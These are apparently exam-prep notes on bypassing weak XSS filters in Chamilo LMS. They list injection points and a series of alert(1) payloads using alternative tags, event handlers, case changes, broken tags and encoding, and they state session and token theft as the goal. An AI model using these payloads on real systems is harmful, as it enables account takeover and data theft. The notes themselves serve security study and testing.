## Filter Evasion & WAF Bypass — Bypassing XSS Filters (Chamilo LMS)

## Objective
Bypass weak XSS filtering in Chamilo LMS to:
- Execute JavaScript
- Steal session / tokens
- Trigger actions as victim

Think: *“What is filtered, and how can I reshape the payload?”*

---

## 1. Context (Chamilo LMS)

- PHP-based LMS
- Known for **weak/partial input filtering**
- Often relies on:
  - Blacklists
  - Basic sanitization
  - HTML stripping (inconsistent)

---

## 2. Where to Inject

Common input points:

- Profile fields
- Course descriptions
- Messages / chat
- File names
- Comments / forum posts

---

## 3. Basic Payload (baseline)

```html
<script>alert(1)</script>
```

→ Usually blocked or stripped

---

## 4. Common Bypass Techniques

### A. Tag variation

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

---

### B. Case bypass

```html
<ScRiPt>alert(1)</ScRiPt>
```

---

### C. Attribute injection

```html
<img src=x onerror=alert(1)>
```

---

### D. Event handlers

```html
<body onload=alert(1)>
<div onmouseover=alert(1)>
```

---

### E. Broken tag structure

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

---

### F. HTML encoding

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

→ Decoded later

---

### G. URL encoding

```text
%3Cscript%3Ealert(1)%3C/script%3E
```

---

### H. Attribute splitting

```html
<img src=x oNerror=alert(1)>
```

---

## 5. Filtering Weakness Patterns

Chamilo often:
- Blocks `<script>` only
- Allows other tags
- Fails to sanitize attributes
- Does not normalize case or encoding

---

## 6. Stored XSS Focus

High impact:

1. Inject payload in stored field
2. Admin / user loads page
3. Payload executes automatically

---

## 7. Indicators of Success

- Payload reflected or stored
- HTML partially rendered
- JavaScript executes
- Event triggers fire

---

## 8. Fast Workflow (Exam Mode)

1. Identify input field
2. Try baseline payload
3. If blocked:
   - switch tag (`svg`, `img`)
   - use event handler
4. Try:
   - case variation
   - encoding
   - broken structure
5. Confirm execution:
   - alert()
   - event trigger

---

## 9. Mental Model

Filters often target:
- `<script>`

But ignore:
- attributes
- alternative tags
- encoding

Your job:
→ Change the vector, not the payload
→ Same execution, different shape